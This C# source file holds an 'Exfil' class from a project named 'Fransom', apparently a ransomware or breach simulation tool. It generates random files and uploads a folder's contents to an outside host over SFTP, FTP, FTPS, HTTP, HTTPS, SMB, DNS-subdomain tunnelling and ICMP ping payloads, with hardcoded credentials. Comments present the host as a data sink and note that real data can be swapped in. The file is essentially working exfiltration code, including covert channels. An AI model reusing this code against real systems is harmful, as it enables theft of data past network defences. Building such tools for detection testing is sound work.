using FluentFTP;
using Renci.SshNet;
using Renci.SshNet.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Fransom
{
    class Exfil
    {
        string folder = "Fransom_data_exfiltration";
        string user = "fransom";
        string pass = "Fr@ns0m123!";
        string exfilhost = "blackhole.fraktal.cloud"; // blackhole accepts and deletes anything you throw at it

        void AddFile(string location, int size)
        {
            byte[] data = new byte[size * 1024 * 1024];
            Random rng = new Random();
            rng.NextBytes(data);
            File.WriteAllBytes(location + "\\" + Path.GetRandomFileName(), data);
        }

        public string BytesToBase32(byte[] bytes)
        {
            const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
            string output = "";
            for (int bitIndex = 0; bitIndex < bytes.Length * 8; bitIndex += 5)
            {
                int dualbyte = bytes[bitIndex / 8] << 8;
                if (bitIndex / 8 + 1 < bytes.Length)
                    dualbyte |= bytes[bitIndex / 8 + 1];
                dualbyte = 0x1f & (dualbyte >> (16 - bitIndex % 8 - 5));
                output += alphabet[dualbyte];
            }
            return output;
        }


        public Exfil()
        {
            // generate random exfil data if none exists; touching disk allows substituting in real data for testing
            if (!Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
            }

            if (!Directory.EnumerateFileSystemEntries(folder).Any())
            {
                Random rnd = new Random();
                int filecount = rnd.Next(50);
                for (int i = 0; i < filecount; i++)
                {
                    AddFile(folder, rnd.Next(10));
                }
            }
        }


        public void ExfilSFTP()
        {
            var connectionInfo = new ConnectionInfo(exfilhost,
                                        user,
                                        new PasswordAuthenticationMethod(user, pass));
            using (var client = new SftpClient(connectionInfo))
            {
                client.Connect();
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;

                foreach (FileSystemInfo info in infos)
                {
                    using (var fileStream = new FileStream(info.FullName, FileMode.Open))
                    {
                        client.UploadFile(fileStream, "/uploads/" + info.Name);
                        FileInfo f = new FileInfo(info.FullName);
                        d += f.Length / (1024 * 1024);
                        Console.WriteLine("[*] Exfiltrated " + info.Name + " using SFTP. Total exfil'd data: " + d + " megabytes");
                    }
                }
            }
        }
        public void ExfilFTP()
        {
            using ( var client = new FtpClient(exfilhost, "ftp", "fraktal@"))
            {
                client.Connect();
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;
                foreach (FileSystemInfo info in infos)
                {
                    client.UploadFile(info.FullName, "/uploads/" + info.Name);
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using FTP. Total exfil'd data: " + d + " megabytes");
                }
            }
        }
        public void ExfilFTPS()
        {
            using (var client = new FtpClient(exfilhost, user, pass))
            {
                client.AutoConnect(); // AutoConnect handles ftps
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;

                foreach (FileSystemInfo info in infos)
                {
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    client.UploadFile(info.FullName, "/" + info.Name);

                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using FTPS. Total exfil'd data: " + d + " megabytes");
                }
            }
        }
        public void ExfilHTTP()
        {
            IWebProxy defaultWebProxy = WebRequest.GetSystemWebProxy();
            defaultWebProxy.Credentials = CredentialCache.DefaultCredentials;
            using (WebClient client = new WebClient())
            {
                client.Proxy = defaultWebProxy;
                client.UseDefaultCredentials = true;
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();

                long d = 0;
                foreach (FileSystemInfo info in infos)
                {
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using HTTP. Total exfil'd data: " + d + " megabytes");
                    client.UploadFile("http://" + exfilhost + "/blackhole", info.FullName);
                }
            }
        }

        public void ExfilHTTPS()
        {
            IWebProxy defaultWebProxy = WebRequest.GetSystemWebProxy();
            defaultWebProxy.Credentials = CredentialCache.DefaultCredentials;
            using (WebClient client = new WebClient())
            {
                client.Proxy = defaultWebProxy;
                client.UseDefaultCredentials = true;
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;
                foreach (FileSystemInfo info in infos)
                {
                    client.UploadFile("https://" + exfilhost + "/blackhole", info.FullName);
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using HTTPS. Total exfil'd data: " + d + " megabytes");
                }
            }

        }
        public void ExfilSMB()
        {
            // quick and dirty
            Console.WriteLine("[*] Authenticating towards SMB share");
            Process process = new Process();
            string output, err;
            try
            {
                process.StartInfo.FileName = "net.exe";
                process.StartInfo.Arguments = "use \\\\" + exfilhost + "\\uploads" + " /user:.\\" + user + " " + pass;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                err = process.StandardError.ReadToEnd();
                process.WaitForExit();
            } catch (Exception e)
            {
                Console.WriteLine("[X] SMB connection failed: " + e.Message);
                return;
            }

            Console.WriteLine("[*] Authentication success");

            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
            long d = 0;
            foreach (FileSystemInfo info in infos)
            {
                FileInfo f = new FileInfo(info.FullName);
                d += f.Length / (1024 * 1024);

                File.Copy(info.FullName, "\\\\" + exfilhost + "\\uploads\\" + info.Name);
                Console.WriteLine("[*] Exfiltrated " + info.Name + " using SMB. Total exfil'd data: " + d + " megabytes");
            }

            Console.WriteLine("[*] Clearing SMB share credentials");
            process.StartInfo.Arguments = "use /delete \\\\" + exfilhost + "\\uploads";
            process.Start();
            output = process.StandardOutput.ReadToEnd();
            err = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        public void ExfilDNS()
        {
            // can use base32 encoding to survive eventual case conversion and add seqno req's if this needs to "work"
            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
            long d = 0;
            foreach (FileSystemInfo info in infos)
            {
                string encoded = Convert.ToBase64String(File.ReadAllBytes(info.FullName));
                encoded = encoded.Replace("/", "SLASH");
                encoded = encoded.Replace("+", "PLUS");
                encoded = encoded.Replace("=", "EQU");
                List<string> chunks = new List<string>();
                int recordlen = 63;
                for (int i = 0; i < encoded.Length; i += recordlen)
                {
                    if ((i + recordlen) < encoded.Length)
                        chunks.Add(encoded.Substring(i, recordlen));
                    else
                        chunks.Add(encoded.Substring(i));
                }
                foreach (var chunk in chunks)
                {
                    // this can be somewhat slow because of rate limiting and other factors
                    IPHostEntry ignored = Dns.GetHostEntry(chunk + ".dns." + exfilhost);
                }

                FileInfo f = new FileInfo(info.FullName);
                d += f.Length / (1024 * 1024);
                Console.WriteLine("[*] Exfiltrated " + info.Name + " using DNS. Total exfil'd data: " + d + " megabytes");
            }
        }
        public void ExfilICMP()
        {
            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
            long d = 0;
            int timeout_ms = 1; // how long to wait for responses, they are not used so just spew as fast as possible
            Ping pkt = new Ping();
            PingOptions popt = new PingOptions(64,false); // ttl, dontFragment
            IPHostEntry hostEntry = Dns.GetHostEntry(exfilhost);
            foreach (FileSystemInfo info in infos)
            {
                // this encoding is not required 
                string encoded = Convert.ToBase64String(File.ReadAllBytes(info.FullName));
                encoded = encoded.Replace("/", "SLASH");
                encoded = encoded.Replace("+", "PLUS");
                encoded = encoded.Replace("=", "EQU");
                List<string> chunks = new List<string>();
                int chunksize = 128; // up for perf gains
                for (int i = 0; i < encoded.Length; i += chunksize)
                {
                    if ((i + chunksize) < encoded.Length)
                        chunks.Add(encoded.Substring(i, chunksize));
                    else
                        chunks.Add(encoded.Substring(i));
                }
                foreach (var chunk in chunks)
                {
                    pkt.Send(hostEntry.AddressList[0], timeout_ms, Encoding.ASCII.GetBytes(chunk), popt);
                }

                FileInfo f = new FileInfo(info.FullName);
                d += f.Length / (1024 * 1024);
                Console.WriteLine("[*] Exfiltrated " + info.Name + " using ICMP. Total exfil'd data: " + d + " megabytes");
            }
        }
    }
}
